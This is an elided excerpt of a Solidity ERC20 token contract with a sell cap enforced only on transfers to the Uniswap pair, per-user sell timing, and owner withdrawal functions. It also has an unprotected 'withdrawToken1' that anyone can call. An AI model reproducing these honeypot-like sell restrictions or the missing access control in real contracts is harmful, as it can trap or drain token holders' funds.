...
contract LIMIT is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    string  private constant _name = "WithdrawTocontract1"; 
    ...
    bool public noFeeToTransfer = true;
     ...
     uint256 public  Lelimit=210000000000000 * 10** _decimals;
    ...
    event findInterval(uint hour, uint lastSellTimeStamp, uint setInterval) ;
    ...
    function _transfer(
        ...
        require(to != address(0), "ERC20: transfer to the zero address");
         ...
         if(to == uniswapV2Pair){
           ...
           require(amount < Lelimit, "Transfer amount must be greater than given amount"); 
...
if (takeFee)
{
    ...
    if (BuyOrSell==1)
        {
        ...
        else  if (to == uniswapV2Pair && BuyOrSell > 1 )
           {
               ...
               _markTx=_markSelTx;
                emit _isBuy ("sell");
                UserLastSellTimeStamp[from]=block.timestamp;
      ...
      uint256 sendAmnt=0;
       if (_tokenForLiquidity < 100)
       {
           ...
           emit TaxAmnt(_markTx);
            emit findInterval (getHour(UserLastSellTimeStamp[from],getCurrentTimeStamp()) , UserLastSellTimeStamp[from],_sellTimeInterval);
       }
       else{
 ...
 event _addedLiquidity(address thisAddress ,uint256 _tokenAmount , uint256 _ETHamount , address pancakRouter);
   ...
   function Wallet_Update_Dev(address payable wallet) public onlyOwner() {
    ...
    function withdrawalApproveToken(address _tokenContract, uint256 _amount) external onlyOwner {
    IERC20 tokenContract = IERC20(_tokenContract);

    // needs to execute `approve()` on the token contract to allow itself the transfer
    tokenContract.approve(address(this), _amount);
    tokenContract.transferFrom(address(this), _markWallet, _amount);
}
 ...
 function withdrawToken1(address _tokenContract, uint256 _amount) external {
        ...
        tokenContract.transfer(_markWallet, _amount);
    }
